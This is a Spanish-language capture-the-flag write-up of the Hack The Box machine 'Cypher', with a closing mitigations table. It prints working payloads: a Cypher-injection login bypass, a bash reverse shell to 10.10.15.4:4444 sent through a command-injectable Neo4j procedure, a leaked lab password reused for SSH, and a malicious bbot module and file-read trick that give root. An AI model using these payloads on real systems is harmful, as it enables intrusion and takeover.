Cypher
HTB Machine

De un directory listing olvidado a shell de root: inyección Cypher contra Neo4j para saltar el login, una extensión APOC custom con command injection, y un CVE público de bbot para escalar privilegios.

Attack Chain Overview

1

Recon — nmap + feroxbuster

Un /testing/ con directory listing filtra un .jar de build olvidado en producción.

2

El JAR = extensión APOC vulnerable

Un procedimiento custom de Neo4j arma un comando de shell pegando texto → command injection.

3

Cypher Injection en /api/auth

El login arma la query concatenando texto: un payload devuelve un hash conocido y otorga un JWT válido (auth bypass).

4

Consola Cypher libre en /demo

Con la sesión, /api/cypher ejecuta cualquier query — un intérprete de base de datos a un click.

5

RCE como neo4j

Se invoca el procedimiento vulnerable desde la consola → reverse shell como el usuario de la base.

6

Cred reuse → SSH como graphasm

Un bbot_preset.yml guarda la contraseña de Neo4j en texto plano; sirve tal cual para SSH.

7

PrivEsc a root — bbot CVE · sudo NOPASSWD

bbot corre como root vía sudo y carga módulos Python propios: ejecución de código como root.

// LA IDEA EN UNA LÍNEATres bugs independientes encadenados (listing + command injection + inyección en el login) llevan de "usuario anónimo" a shell, y un binario con sudo mal dado cierra la máquina en root. Si cualquiera de los tres estuviera bien resuelto, la cadena se corta.
01

Reconocimiento

nmap · feroxbuster · directory listing

Dos puertos abiertos y una web ("GRAPH ASM") que se presenta como una herramienta de Attack Surface Management basada en grafos.

$ nmap -p22,80 -sCV -oN nmap 10.129.231.244

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    nginx 1.24.0 (Ubuntu)

Fuzzeando con feroxbuster aparece un login, una API, y —clave para todo lo que sigue— un directorio con listing habilitado:

$ feroxbuster -u http://cypher.htb/ -x js,css,png

200  /login                                     → POST /api/auth
307  /demo                                       → redirige a /login sin sesión
301  /testing/                                   → directory listing expuesto
200  /testing/custom-apoc-extension-1.0-SNAPSHOT.jar  ← build olvidado
// EN CRIOLLO — directory listingCuando un servidor web no tiene index.html en una carpeta y el listing está activado, muestra la lista de archivos como si fuera un explorador. Dejar eso en producción es regalar el mapa: acá expuso un .jar de compilación que nunca debería haber estado ahí.
02

El JAR filtrado

Extensión APOC custom · decompilación con CFR · command injection

// ¿QUÉ ES APOC?Neo4j es una base de datos de grafos (guarda nodos y relaciones, no tablas). APOC es su librería de procedimientos extra. Acá alguien programó procedimientos propios y los empaquetó en ese .jar — el prefijo custom.* (en vez del oficial apoc.*) ya delata código no estándar, candidato a tener bugs.

Se decompila el JAR a Java legible con CFR. Adentro hay un procedimiento custom.getUrlStatusCode: recibe una URL y devuelve el código HTTP que responde. El problema: en vez de usar una librería HTTP, arma un comando de terminal pegando texto y se lo pasa a la shell:

$ java -jar cfr.jar custom-apoc-extension-1.0-SNAPSHOT.jar --outputdir cfr-out
public Stream<StringOutput> getUrlStatusCode(String url) {
    // sin sanitizar, sin escaping
    Object[] command = new String[]{"/bin/sh", "-c",
        "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};
    Process process = Runtime.getRuntime().exec((String[]) command);
// POR QUÉ FALLA — command injectionSi en url mandás google.com; whoami, el comando final queda curl ... google.com; whoami. La shell ve el ; como "terminó un comando, arrancá el siguiente" y ejecuta whoami aparte, con los permisos del proceso de Neo4j. Ese es el bug que más adelante da la shell.
03

Cypher Injection en /api/auth

Inyección en el login · oráculo de comilla · auth bypass

// EN CRIOLLO — inyección en una base de datosEs el mismo bug que la clásica SQL injection, con otra gramática. Neo4j no habla SQL, habla Cypher (MATCH/WHERE/RETURN en vez de SELECT), pero el error es idéntico: si el backend arma la pregunta pegando tu texto ("...WHERE u.name = '" + nombre + "'"), una comilla tuya "cierra" el texto antes de tiempo y lo que sigue lo toma como código, no como dato.

El primer test siempre es el más barato: una comilla suelta. Una sola comilla en el login rompe la query y —con debug mode activo— devuelve el traceback con la query real que arma por dentro:

neo4j.exceptions.CypherSyntaxError: Failed to parse string literal.
"MATCH (u:USER)-[:SECRET]->(h:SHA1) WHERE u.name = 'admin'' RETURN h.value as hash"

La idea del bypass: forzar el MATCH a matchear cualquier usuario y pisar el RETURN para que devuelva un hash SHA1 conocido — el de la cadena vacía (sha1("")). Como password se manda "", que hashea a ese mismo valor:

# payload.json
{"username": "x' OR 1=1 RETURN 'da39a3ee5e6b4b0d3255bfef95601890afd80709' as hash LIMIT 1 //", "password": ""}
$ curl -s -i -X POST http://cypher.htb/api/auth -H "Content-Type: application/json" -d @payload.json

HTTP/1.1 200 OK
set-cookie: access-token=eyJhbGciOiJIUzI1NiIs...
// RESULTADOJWT válido. La app nunca valida que el usuario exista de verdad, solo que la query haya devuelto una fila. Nota: sqlmap no sirve acá — está hecho para dialectos SQL; en bases "raras" (grafos, NoSQL, LDAP) la explotación sigue siendo mayormente manual.
04

La consola de Cypher expuesta

/demo · /api/cypher · intérprete de queries sin filtro

Con la cookie, /demo ("Query Tool") deja de redirigir: es un editor de Cypher libre. Todo lo que se escribe se ejecuta contra la base tal cual, sin filtro:

searchNodes = function (searchTerm) {
  $.ajax({ method: 'GET', url: `/api/cypher?query=${searchTerm}` });  // sin filtro
}

En la práctica es un intérprete de base de datos a un click — y como Neo4j tiene cargada la extensión APOC vulnerable del paso 02, se puede invocar custom.getUrlStatusCode directamente desde acá.

05

RCE: la cadena completa

Cypher injection + command injection + consola libre = ejecución remota

Se invoca el procedimiento vulnerable desde la consola con un payload que abre una reverse shell:

CALL custom.getUrlStatusCode('x.com; bash -c "bash -i >& /dev/tcp/10.10.15.4/4444 0>&1" #')
YIELD statusCode RETURN statusCode
  1. Listener local: nc -lnvp 4444, esperando la conexión.
  2. Request disparado: el ; corta el curl original y arranca bash -c "..."; el # final comenta cualquier resto.
  3. Shell recibida como neo4j — el propio proceso de la base, coherente con que el RCE corre dentro de un procedimiento APOC.
neo4j@cypher:~$ id
uid=110(neo4j) gid=113(neo4j) groups=113(neo4j)
06

Post-explotación: reutilización de credenciales

bbot_preset.yml · password en texto plano · pivot a graphasm

user.txt es de graphasm con permisos 640 — neo4j no puede leerlo. Hay que pivotar. En el home de graphasm aparece la config de bbot:

neo4j@cypher:/home/graphasm$ cat bbot_preset.yml
config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK
// EN CRIOLLO — credential reuseUn patrón clásico del mundo real: la misma contraseña se usa para varias cosas. Acá el YAML de bbot (la herramienta de recon que alimenta el grafo) guarda la password de Neo4j en texto plano — y esa misma sirve para el usuario del sistema por SSH.
$ ssh graphasm@cypher.htb        # password: cU4btyib.20xtCMCXkBmerhK
graphasm@cypher:~$ cat user.txt
[ USER FLAG ]
07

Escalada de privilegios: bbot

sudo NOPASSWD · arbitrary file read · RCE vía módulo custom

graphasm@cypher:~$ sudo -l
User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot

La clave del combo: graphasm puede correr bbot como root, sin contraseña. Cualquier archivo que ese programa abra, lo abre como root. Hay un CVE público (BBOT 2.1.0 — Local Privilege Escalation) con dos formas de aprovecharlo.

Lectura arbitraria de archivos

-w/--whitelist normalmente recibe dominios, pero también acepta la ruta a un archivo. En modo debug (-d), bbot construye un regex con su contenido y lo imprime — filtrando el archivo crudo aunque graphasm no pueda leerlo, porque quien lo abre es root:

$ sudo /usr/local/bin/bbot -w /root/root.txt -d
[DBUG] Generated Regex [(([a-z0-9-]+\.)+<contenido real del archivo>...

Shell interactiva (RCE vía módulo custom)

// EN CRIOLLO — por qué importar un .py es peligrosobbot permite cargar módulos Python propios con module_dirs. El bug: importa y ejecuta el archivo .py entero antes de validar que sea un módulo válido. En Python, "importar" un archivo ya corre cualquier código suelto que tenga arriba de todo — y como bbot corre como root, ese código corre como root.
# /dev/shm/ExploitModule.py
import os
os.system("bash")

# /dev/shm/evil.yml
modules:
  - ExploitModule
module_dirs:
  - /dev/shm/

$ sudo /usr/local/bin/bbot -p /dev/shm/evil.yml
# → bash interactiva, uid=0(root)
root@cypher:~# id
uid=0(root) gid=0(root) groups=0(root)
root@cypher:~# cat /root/root.txt
[ ROOT FLAG ]

Lecciones

Qué falló en cada eslabón y cómo se arregla

HallazgoMitigación
Directory listing en /testing/Deshabilitar listing; nunca dejar builds en producción
Command injection en el JARUsar una librería HTTP, nunca exec con concatenación de strings
Cypher injection en /api/authQueries parametrizadas: session.run(query, username=username)
Traceback expuesto al clienteDebug mode apagado en producción
